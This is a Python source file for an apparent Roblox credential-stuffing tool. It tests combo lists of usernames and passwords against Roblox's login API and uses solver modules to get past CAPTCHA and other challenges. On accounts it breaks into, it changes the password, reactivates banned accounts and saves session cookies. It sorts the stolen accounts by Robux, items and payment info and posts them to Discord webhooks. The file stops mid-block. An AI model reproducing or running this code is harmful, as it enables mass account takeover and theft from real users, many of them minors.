import sys, os, string, random, re, nltk
from nltk.corpus import words
from difflib import get_close_matches
from time import sleep
from json import loads, dumps
from base64 import b64decode, b64encode
from custom_solver import get_token
from thread_lock import ThreadLock
from counter import Counter
from combocheck import ComboCheck
from session import Session
from output import Output
from account_info import AccountInfo, has_payment_info
from auth_intent import AuthIntent
from rostile import Rostile
from util import Util
from secure import Secure

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

config = Util.get_config()

WEBHOOK_ENABLED = config["logWebhook"]

DISCORD_ID = config.get("discordId", None)

AUTO_SECURE = config.get("autoSecure", {"password": {"enabled": True, "prefix": ""}, "underage": False})

SKIP_COMBOS = config.get("skipCombos", {})
SKIP_INVALID = SKIP_COMBOS.get("skip_invalid", True)
SKIP_CHECKED = SKIP_COMBOS.get("skip_checked", True)


if WEBHOOK_ENABLED == True:
    from discord_webhook import DiscordWebhook, DiscordEmbed

if type(WEBHOOK_ENABLED) != bool:
    Output("ERROR").log("You must put either true/false for webhook enabled")

WEBHOOKS = config["webhooks"]
WEBHOOK_KEYS = [
    "default", "old_accounts", "locked_accounts", "rap",
    "rare_items", "items", "banned_accounts", "robux"
]

WEBHOOK_VARS = {key: None if (value := WEBHOOKS.get(key, "")) == "" else value for key in WEBHOOK_KEYS}

WEBHOOK = WEBHOOK_VARS["default"]
OLD_WEBHOOK = WEBHOOK_VARS["old_accounts"]
LOCKED_WEBHOOK = WEBHOOK_VARS["locked_accounts"]
RAP_WEBHOOK = WEBHOOK_VARS["rap"]
RARE_WEBHOOK = WEBHOOK_VARS["rare_items"]
ITEM_WEBHOOK = WEBHOOK_VARS["items"]
BANNED_WEBHOOK = WEBHOOK_VARS["banned_accounts"]
ROBUX_WEBHOOK = WEBHOOK_VARS["robux"]

HIDE_OUTPUT = config.get("hideOutput", {})
HIDE_OUTPUT_ENABLED = HIDE_OUTPUT.get("enabled", False)
HIDE_OUTPUT_EMAIL = HIDE_OUTPUT.get("email", {})
HIDE_OUTPUT_USERNAME = HIDE_OUTPUT.get("username", {})

HIDE_INVALID_EMAIL = HIDE_OUTPUT_EMAIL.get("hide_invalid", False)
HIDE_VALID_EMAIL = HIDE_OUTPUT_EMAIL.get("hide_valid", False)
HIDE_LOCKED_EMAIL = HIDE_OUTPUT_EMAIL.get("hide_locked", False)
HIDE_CHECKED_EMAIL = HIDE_OUTPUT_EMAIL.get("hide_checked", False)
HIDE_CHECKING_EMAIL = HIDE_OUTPUT_EMAIL.get("hide_checking", False)

HIDE_INVALID_USERNAME = HIDE_OUTPUT_USERNAME.get("hide_invalid", False)
HIDE_VALID_USERNAME = HIDE_OUTPUT_USERNAME.get("hide_valid", False)
HIDE_LOCKED_USERNAME = HIDE_OUTPUT_USERNAME.get("hide_locked", False)
HIDE_CHECKED_USERNAME = HIDE_OUTPUT_USERNAME.get("hide_checked", False)
HIDE_CHECKING_USERNAME = HIDE_OUTPUT_USERNAME.get("hide_checking", False)

DEBUG = config.get("debug", False)

badge_icons = {
    "Administrator": "<:Administrator:1345542368056578079>",
    "Ambassador": "<:Ambassador:1345542370195800147>",
    "Bloxxer": "<:Bloxxer:1345542748777873472>",
    "Bricksmith": "<:Bricksmith:1345542374545166406>",
    "Combat Initiation": "<:CombatInitiation:1345542750837276704>",
    "Friendship": "<:Friendship:1345542378026700982>",
    "Homestead": "<:Homestead:1345542380367122453>",
    "Inviter": "<:Inviter:1345542382313279538>",
    "Official Model Maker": "<:OfficialModelMaker:1345542384473210930>",
    "Veteran": "<:Veteran:1345542385932701749>",
    "Warrior": "<:Warrior:1345542752359677974>",
    "Outrageous Builders Club": "<:OutrageousBuildersClub:1345683662972256256>",
    "Turbo Builders Club": "<:TurboBuildersClub:1345683653719494686>",
    "Welcome To The Club": "<:WelcomeToTheClub:1345683661592334398>"
}


def get_int_value(value_str):
    """Safely convert formatted number string to int. Returns None if invalid."""
    if value_str in ("_unknown", "Unauthorized", None, ""):
        return None
    try:
        return int(str(value_str).replace(",", ""))
    except (ValueError, AttributeError):
        return None
    
def mask_email(email):
    """Mask email address for privacy"""
    if "@" in email:
        local, domain = email.split("@", 1)
        if len(local) <= 2:
            masked_local = "*" * len(local)
        else:
            masked_local = local[:2] + "*" * (len(local) - 2)
        return f"{masked_local}@{domain}"
    else:
        # If it's a username, mask it similarly
        if len(email) <= 2:
            return "*" * len(email)
        else:
            return email[:2] + "*" * (len(email) - 2)
        
def get_display_name(account_name, is_email=False, context="invalid"):
    """Get display name based on hide settings"""
    if not HIDE_OUTPUT_ENABLED:
        return account_name
        
    should_hide = False
    
    if context == "invalid":
        should_hide = (is_email and HIDE_INVALID_EMAIL) or (not is_email and HIDE_INVALID_USERNAME)
    elif context == "valid":
        should_hide = (is_email and HIDE_VALID_EMAIL) or (not is_email and HIDE_VALID_USERNAME)
    elif context == "locked":
        should_hide = (is_email and HIDE_LOCKED_EMAIL) or (not is_email and HIDE_LOCKED_USERNAME)
    elif context == "checked":
        should_hide = (is_email and HIDE_CHECKED_EMAIL) or (not is_email and HIDE_CHECKED_USERNAME)
    elif context == "checking":
        should_hide = (is_email and HIDE_CHECKING_EMAIL) or (not is_email and HIDE_CHECKING_USERNAME)
        
    return mask_email(account_name) if should_hide else account_name

def is_email(text):
    """Check if text looks like an email"""
    return "@" in text

def replace_badge_names(text):
    pattern = re.compile(r'\b(' + '|'.join(re.escape(badge) for badge in badge_icons) + r')\b')
    text = pattern.sub(lambda match: badge_icons[match.group(0)], text)
    return text.replace(",", "")

class Roblox:
    def __init__(self, lock: ThreadLock, counter: Counter, invalid: ComboCheck, checked_file: ComboCheck, locked: ComboCheck, accounts) -> None:
        self.account = None
        self.attempts = 0
        self.checked = False
        self.lock = lock
        self.counter = counter
        self.accounts = accounts
        self.invalid = invalid
        self.checked_file = checked_file
        self.locked = locked
        self.email = None

    def continue_check(self, continue_payload) -> None:
        sleep(1)

        continue_payload_content = dumps(continue_payload).replace(" ", "").encode("utf-8")

        response = self.session.post('https://apis.roblox.com/challenge/v1/continue', data=continue_payload_content)

        if response.json().get("challengeType") == "captcha":
            return loads(response.json()["challengeMetadata"])

        if response.status_code != 200:
            raise ValueError("Rejected by continue API")

        payload = {
            "ctype": self.ctype,
            "cvalue": self.account[0],
            "password": self.account[1],
            "secureAuthenticationIntent": self.sec_auth_intent
        }

        self.session.headers = {
            **self.session.headers,
            "rblx-challenge-id": continue_payload["challengeId"],
            "rblx-challenge-metadata": b64encode(continue_payload["challengeMetadata"].encode("utf-8")).decode("utf-8"),
            "rblx-challenge-type": continue_payload["challengeType"]
        }

        response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        csrf = response.headers.get("x-csrf-token")

        if csrf != None:
            self.session.headers = {
                **self.session.headers,
                "x-csrf-token": csrf
            }

            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        temp_dict = self.session.headers.copy()

        temp_dict.pop("rblx-challenge-id")
        temp_dict.pop("rblx-challenge-metadata")
        temp_dict.pop("rblx-challenge-type")

        self.session.headers = temp_dict

        if response.status_code == 429:
            raise ValueError("Rate limited")
        
        if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
            return response.json()
        
        if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
            self.account[0] = response.json()["user"]["name"]

            return [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
            
        elif "Challenge failed" in response.text:
            raise ValueError("Rejected by login API")
        
        elif "Account has been locked" in response.text:
            raise ValueError("locked")

        else:
            raise ValueError("invalid")

    def check(self) -> dict:
        while True:
            try:
                if self.counter.get_value() >= len(self.accounts):
                    return

                if self.account == None or self.checked == True:
                    self.checked = False
                    self.attempts = 0

                    with self.lock.get_lock():
                        self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                        self.counter.increment()
                else:
                    if self.attempts == 10:
                        self.checked = False
                        self.attempts = 0

                        with self.lock.get_lock():
                            self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                            self.counter.increment()

                        Output("ERROR").log(f"Incorrect information | {self.account[0]}")

                        with open("output/failed.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                
                Output("INFO").log(f"Checking account | {get_display_name(self.account[0], is_email(self.account[0]), 'checking')}")
                
                if SKIP_INVALID and self.invalid.contains(f"{self.account[0]}:{self.account[1]}") or self.locked.contains(f"{self.account[0]}:{self.account[1]}"):
                    self.checked = True
                    self.invalid.append(f"{self.account[0]}:{self.account[1]}\n")
                    raise ValueError("invalid")
        
                
                if SKIP_CHECKED and self.checked_file.contains(f"{self.account[0]}:{self.account[1]}"):
                    print(f"{self.account[0]}:{self.account[1]}", self.checked_file.contains(f"{self.account[0]}:{self.account[1]}"))
                    self.checked = True
                    raise ValueError("checked")

                self.session, self.sec_ch_ua, self.user_agent, self.proxy = Session().session()
                self.accept_language = "en-US,en;q=0.9"

                self.session.headers = {
                    'sec-ch-ua': self.sec_ch_ua,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'upgrade-insecure-requests': '1',
                    'user-agent': self.user_agent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'priority': 'u=0, i'
                }

                response = self.session.get("https://www.roblox.com/login")
                cookie_header = '; '.join([f"{key}={value}" for key, value in response.cookies.items()])

                self.session.headers = {
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua': self.sec_ch_ua,
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': self.user_agent,
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json;charset=UTF-8',
                    'origin': 'https://www.roblox.com',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'priority': 'u=1, i',
                    "cookie": cookie_header
                }
                
                self.ctype = "Username" if "@" not in self.account[0] else "Email"
                self.sec_auth_intent = AuthIntent.get_auth_intent(self.session)

                self.email = (self.account[2] if len(self.account) > 2 else self.account[0])

                payload = {
                    "ctype": self.ctype,
                    "cvalue": self.account[0],
                    "password": self.account[1],
                    "secureAuthenticationIntent": self.sec_auth_intent
                }

                response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise ValueError("Rate limited")

                csrf = response.headers.get("x-csrf-token")

                self.session.headers = {
                    **self.session.headers,
                    "x-csrf-token": csrf
                }

                response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise ValueError("Rate limited")
                
                if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
                    Output("SUCCESS").log(f"{self.account[0]} Is vaild")

                    self.handle_multi(response.json())

                    self.checked = True
                    continue

                if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                    user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]

                    self.account[0] = response.json()["user"]["name"]

                    Output("SUCCESS").log(f"{self.account[0]} is vaild")

                    cookie_header += f"; .ROBLOSECURITY={response.cookies.get('.ROBLOSECURITY')}"

                    self.handle_valid(user_id_and_cookie, cookie_header)
                    
                    self.checked = True
                    continue
                
                elif "Challenge" in response.text:
                    pass
                
                elif "Account has been locked" in response.text:
                    raise ValueError("locked")

                else:
                    raise ValueError("invalid")
                
                challenge_type = response.headers.get("rblx-challenge-type")

                if challenge_type == "denied":
                    raise ValueError("Challenge type denied")

                challenge_id = response.headers.get("rblx-challenge-id")
                metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
                blob = metadata.get("dataExchangeBlob")
                captcha_id = metadata.get("unifiedCaptchaId")

                if cookie_header.endswith("; "):
                    cookie_header = cookie_header[:-2]

                if challenge_type == "rostile":
                    Output("CAPTCHA").log("Rostile detected")

                    payload = Rostile.get_solution(challenge_id)

                    redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload)

                    csrf = redemption_token.headers.get("x-csrf-token")

                    if csrf != None:
                        self.session.headers = {
                            **self.session.headers,
                            "x-csrf-token": csrf
                        }

                        redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload).json()["redemptionToken"]
                    else:
                        redemption_token = redemption_token.json()["redemptionToken"]

                    challenge_metadata = dumps({
                        "redemptionToken": redemption_token
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "rostile",
                        "challengeMetadata": challenge_metadata
                    }

                    continue_result = self.continue_check(payload)

                    if type(continue_result) == dict:
                        captcha_id = continue_result.get("unifiedCaptchaId")
                        blob = continue_result.get("dataExchangeBlob")

                        Output("CAPTCHA").log("Captcha detected")
                    
                        Output("CAPTCHA").log("Solving captcha")

                        solution = get_token(self.session, blob, self.proxy, cookie_header)

                        if solution == None:     
                            raise ValueError("Failed to solve captcha")
                        
                        token = solution.split("|")[0]
                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                        
                        challenge_metadata = dumps({
                            "unifiedCaptchaId": captcha_id,
                            "captchaToken": solution,
                            "actionType": "Login"
                        }, separators=(',', ':'))

                        payload = {
                            "challengeId": challenge_id,
                            "challengeType": "captcha",
                            "challengeMetadata": challenge_metadata
                        }

                        user_id_and_cookie = self.continue_check(payload)
                    else:
                        user_id_and_cookie = continue_result

                elif challenge_type == "privateaccesstoken":
                    Output("CAPTCHA").log("PAT detected")

                    payload = {"challengeId": challenge_id}

                    response = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload)

                    self.session.headers["Authorization"] = f"PrivateToken token={response.headers['www-authenticate'].split('challenge=')[1]}"

                    redemption_token = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload).json()["redemptionToken"]

                    challenge_metadata = dumps({
                        "redemptionToken": redemption_token
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "privateaccesstoken",
                        "challengeMetadata": challenge_metadata
                    }

                    continue_result = self.continue_check(payload)

                    if type(continue_result) == dict:
                        captcha_id = continue_result.get("unifiedCaptchaId")
                        blob = continue_result.get("dataExchangeBlob")

                        Output("CAPTCHA").log("Captcha detected")
                    
                        Output("CAPTCHA").log("Solving captcha")

                        solution = get_token(self.session, blob, self.proxy, cookie_header)

                        if solution == None:
                            raise ValueError("Failed to solve captcha")
                        
                        token = solution.split("|")[0]
                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                        
                        challenge_metadata = dumps({
                            "unifiedCaptchaId": captcha_id,
                            "captchaToken": solution,
                            "actionType": "Login"
                        }, separators=(',', ':'))

                        payload = {
                            "challengeId": challenge_id,
                            "challengeType": "captcha",
                            "challengeMetadata": challenge_metadata
                        }

                        user_id_and_cookie = self.continue_check(payload)
                    else:
                        user_id_and_cookie = continue_result

                else:
                    Output("CAPTCHA").log("Captcha detected")
                    
                    Output("CAPTCHA").log("Solving captcha")

                    solution = get_token(self.session, blob, self.proxy, cookie_header)

                    attmepts = 1

                    if solution == None:
                        while True:
                            Output("CAPTCHA").log("Retrying captcha")

                            if attmepts == 2:
                                raise ValueError("Failed to solve captcha.")

                            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                            if response.status_code == 429:
                                raise ValueError("Rate limited")

                            challenge_type = response.headers.get("rblx-challenge-type")

                            if challenge_type == "denied":
                                raise ValueError("Challenge type denied")

                            challenge_id = response.headers.get("rblx-challenge-id")
                            metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
                            blob = metadata.get("dataExchangeBlob")
                            captcha_id = metadata.get("unifiedCaptchaId")

                            solution = get_token(self.session, blob, self.proxy, cookie_header)

                            if solution != None:
                                break
                            
                            attmepts += 1

                    token = solution.split("|")[0]
                    token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                    Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                    
                    challenge_metadata = dumps({
                        "unifiedCaptchaId": captcha_id,
                        "captchaToken": solution,
                        "actionType": "Login"
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "captcha",
                        "challengeMetadata": challenge_metadata
                    }

                    user_id_and_cookie = self.continue_check(payload)

                if type(user_id_and_cookie) == dict:
                    display_name = get_display_name(self.account[0], is_email(self.account[0]), "valid")
                    Output("SUCCESS").log(f"{display_name} is valid (multiple accounts)")

                    self.handle_multi(user_id_and_cookie)

                    self.checked = True
                    continue

                display_name = get_display_name(self.account[0], False, "valid")  # Username after successful login
                Output("SUCCESS").log(f"{display_name} is valid")

                cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"

                self.handle_valid(user_id_and_cookie, cookie_header)

                self.checked = True

            except Exception as e:
                if str(e) == "invalid":
                    self.checked = True

                    display_name = get_display_name(self.account[0], is_email(self.account[0]), "invalid")
                    Output("ERROR").log(f"{display_name} is incorrect")

                    with self.lock.get_lock():
                        with open("output/invalid.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                elif str(e) == "locked":
                    self.checked = True

                    display_name = get_display_name(self.account[0], is_email(self.account[0]), "locked")
                    Output("WARNING").log(f"{display_name} is locked")

                    og_combo = f'{self.account[0]}:{self.account[1]}'

                    with self.lock.get_lock():
                        with open("output/locked.txt", "a", encoding="utf-8") as file:
                            file.write(f'{og_combo}\n')

                    if self.account[1].isupper():
                        new_password = self.account[1].lower()
                    else:
                        match = re.search(r'[A-Za-z]', self.account[1])
                        if match:
                            index = match.start()
                            new_password = (
                                self.account[1][:index] + self.account[1][index].swapcase() + self.account[1][index+1:]
                            )
                        else:
                            new_password = self.account[1]

                    combo = f'{self.account[0]}:{new_password}'
                    if not self.locked.contains(combo):
                        self.accounts.insert(self.counter.get_value() + 1, combo + '\n')

                    self.locked.append(combo)

                    if WEBHOOK_ENABLED:
                        try:
                            webhook = DiscordWebhook(url=LOCKED_WEBHOOK if LOCKED_WEBHOOK else WEBHOOK)

                            embed = DiscordEmbed(title=f'**New Locked**', color='00FF00')
                            embed.set_description(f"**{og_combo}**")

                            embed.set_timestamp()

                            webhook.add_embed(embed)
                            webhook.execute()
                        except Exception as e: 
                            pass
                elif str(e) == "checked":
                    display_name = get_display_name(self.account[0], is_email(self.account[0]), "checked")
                    Output("WARNING").log(f"{display_name} already checked")
                else:
                    Output("ERROR").log(str(e))

                    self.attempts += 1

                    continue

    def handle_valid(self, user_id_and_cookie, cookie_header) -> None:
        self.session.headers = {
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'user-agent': self.user_agent,
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.roblox.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.roblox.com/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': self.accept_language,
            'priority': 'u=1, i',
            "cookie": cookie_header
        }

        temp_session, _, _, _ = Session().session()

        DEBUG and Output("INFO").log("Getting_Ban_Status")

        user_info_nocookie = temp_session.get(f"https://users.roblox.com/v1/users/{user_id_and_cookie[0]}").json()
        user_info = self.session.get(f"https://users.roblox.com/v1/users/{user_id_and_cookie[0]}").json()

        is_termed = user_info_nocookie.get("isBanned")
        is_banned = False
        unbanned = False
        if user_info.get("errors"):
            is_banned = user_info["errors"][0]["message"] == "User is moderated"

        DEBUG and Output("INFO").log("Getting_CSRF")

        csrf = self.session.post("https://auth.roblox.com/v2/logout").headers["x-csrf-token"]

        self.session.headers = {
            **self.session.headers,
            "x-csrf-token": csrf
        }

        if is_banned:
            response = self.session.post("https://usermoderation.roblox.com/v1/not-approved/reactivate")
            DEBUG and Output("INFO").log("Unbanned Account")
            DEBUG and Output("INFO").log(response.text, response.status_code)
            if response.status_code == 200:
                is_banned = False
                unbanned = True

        old_password = self.account[1]

        if not (is_termed or is_banned):
            try:
                DEBUG and Output("INFO").log("Securing_Account")
                if not has_payment_info(self.session) and AUTO_SECURE.get("underage"):
                    suc = Secure.change_birthdate(self.session, self.account)

                dont_change_if_underage_failed = AUTO_SECURE.get("password", {}).get("DontChangeIfUnderageFailed", False)
                suc_val = locals().get("suc", True)
                if not suc_val:
                    DEBUG and Output("INFO").log("Underage change failed, skipping password change.")
                if AUTO_SECURE.get("password", {}).get("enabled") and (not dont_change_if_underage_failed or suc_val):
                
                    new_password = AUTO_SECURE.get("password", {}).get("prefix", "") + ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(25))
                    change_password, new_cookie = Secure.change_password(self.session, new_password, self.account[1], self.sec_auth_intent)
        
                    if change_password:
                        self.account[1] = new_password
                    if new_cookie:
                        user_id_and_cookie[1] = new_cookie
                        cookie_header = cookie_header.split("; .ROBLOSECURITY=")[0] + f"; .ROBLOSECURITY={new_cookie}"
                        self.session.headers = {
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-ch-ua': self.sec_ch_ua,
                            'sec-ch-ua-mobile': '?0',
                            'user-agent': self.user_agent,
                            'accept': 'application/json, text/plain, */*',
                            'content-type': 'application/json;charset=UTF-8',
                            'origin': 'https://www.roblox.com',
                            'sec-fetch-site': 'same-site',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-dest': 'empty',
                            'referer': 'https://www.roblox.com/',
                            'accept-encoding': 'gzip, deflate, br, zstd',
                            'accept-language': self.accept_language,
                            'priority': 'u=1, i',
                            "cookie": cookie_header
                        }

            except Exception as e:
                DEBUG and Output("ERROR").log(e)
                pass

        with self.lock.get_lock():
            with open("output/valid.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        with self.lock.get_lock():
            with open("output/valid_combo.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}\n')

        with self.lock.get_lock():
            with open("output/cookies.txt", "a", encoding="utf-8") as file:
                file.write(f'{user_id_and_cookie[1]}\n')

        with self.lock.get_lock():
            with open("output/og_combo.txt", "a", encoding="utf-8") as file:
                file.write(f"{self.account[0]}:{old_password}:{self.email}\n")
                self.checked_file.append(f"{self.account[0]}:{old_password}:{self.email}\n")

        if not (is_termed or is_banned):
            DEBUG and Output("INFO").log("Getting_Account_Info")
            acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie[0])


        if WEBHOOK_ENABLED:
            DEBUG and Output("INFO").log("Sending_Webhook")
            try:
                webhook = DiscordWebhook(
                    url=BANNED_WEBHOOK if BANNED_WEBHOOK and is_termed else RAP_WEBHOOK if RAP_WEBHOOK and not (is_termed or is_banned) and get_int_value(acc_info.get("RAP")) is not None and get_int_value(acc_info.get("RAP")) > 0 else ROBUX_WEBHOOK if ROBUX_WEBHOOK and not (is_termed or is_banned) and get_int_value(acc_info.get("Robux")) is not None and get_int_value(acc_info.get("Robux")) > 0 else RARE_WEBHOOK if RARE_WEBHOOK and not (is_termed or is_banned) and acc_info.get("Rare Items", "") not in ("None", "_unknown", "Unauthorized", "") else OLD_WEBHOOK if OLD_WEBHOOK and not (is_termed or is_banned) and acc_info.get('Creation Date', '9999') not in ("_unknown", "Unauthorized") and acc_info.get('Creation Date', '9999').isdigit() and int(acc_info['Creation Date']) <= 2008 else ITEM_WEBHOOK if ITEM_WEBHOOK and not (is_termed or is_banned) and get_int_value(acc_info.get("Total Items")) is not None and get_int_value(acc_info.get("Total Items")) >= 5 else WEBHOOK,
                    content=f"<@{DISCORD_ID}>" if DISCORD_ID and str(DISCORD_ID) != "" else "@here"
                )

                embed = DiscordEmbed(title=f'**@{self.account[0]}** ({user_id_and_cookie[0]})', color='00FF00')

                if not (is_termed or is_banned):
                    embed.set_footer(f"NoSolve | discord.gg/nosolve")

                    for key, value in acc_info.items():
                        if key == "Thumbnail":
                            embed.set_thumbnail(str(value) if value != "_unknown" else "https://static.wikia.nocookie.net/roblox/images/6/66/Content_Deleted.png/")
                        else:
                            if str(value) != "_unknown":
                                embed.add_embed_field(name=key, value=str(value) if key != "Badges" else replace_badge_names(str(value)), inline=True)
                else:
                    embed.add_embed_field(name="Ban Status", value="Termed" if is_termed else "Temp-Banned")

                if unbanned:
                    embed.add_embed_field(name="Ban Status", value="Reactivated account")

                embed.set_timestamp()

                webhook.add_embed(embed)
                webhook.execute()
            except Exception as e:
                print(e)
                pass

        def is_real_word_or_leetspeak(word):
            nltk.download("words", quiet=True)
            word_list = set(words.words())
            
            if word in word_list:
                return "snipe"
            
            leet_map = {"0": "o", "1": "l", "3": "e", "4": "a", "5": "s", "7": "t", "8": "b"}
            normalized_word = re.sub(r'[0134578]', lambda x: leet_map[x.group()], word)
            
            if normalized_word in word_list:
                return "leet"
            
            close_matches = get_close_matches(word, word_list, n=1, cutoff=0.8)
            if close_matches:
                return "semi"
            
            return "unknown"
        
        user_type = is_real_word_or_leetspeak(self.account[0])
        
        DEBUG and Output("INFO").log("Writing_Output_Files")

        if not (is_termed or is_banned):    
            with self.lock.get_lock():
                with open(f"output/robux/robux{acc_info['Robux']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/rap/rap{acc_info['RAP']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
            
            with self.lock.get_lock():
                with open(f"output/creation_date/year{acc_info['Creation Date']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/balance/balance{acc_info['Balance']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/rare_items/items_{acc_info['Rare Items']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/pending/pending{acc_info['Pending']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/summary/summary{acc_info['Summary']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/items/items_{acc_info['Total Items']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            with self.lock.get_lock():
                with open(f"output/badges/badges_{acc_info['Badges']}.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
            
            if user_type == "snipe":
                with self.lock.get_lock():
                    with open(f"output/usernames/snipes.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            elif user_type == "leet":
                with self.lock.get_lock():
                    with open(f"output/usernames/leetspeaks.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            elif user_type == "semi":
                with self.lock.get_lock():
                    with open(f"output/usernames/semi_snipes.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            if len(self.account[0]) == 3:
                with self.lock.get_lock():
                    with open(f"output/usernames/3chars.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            if len(self.account[0]) == 4:
                with self.lock.get_lock():
                    with open(f"output/usernames/4chars.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            if acc_info["Payment Info"] is True:
                with self.lock.get_lock():
                    with open(f"output/payment_info/payment_info.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
            
            elif acc_info["Payment Info"] == "_unknown":
                with self.lock.get_lock():
                    with open(f"output/payment_info/payment_info_unknown.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
            
            if acc_info["Premium"] is True:
                with self.lock.get_lock():
                    with open(f"output/premium/premium.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

            elif acc_info["Premium"] == "_unknown":
                with self.lock.get_lock():
                    with open(f"output/premium/premium_unknown.txt", "a", encoding="utf-8") as file:
                        file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        else:
            if is_termed:
                with self.lock.get_lock():
                    with open("output/terminated.txt", "a", encoding="utf-8") as file:
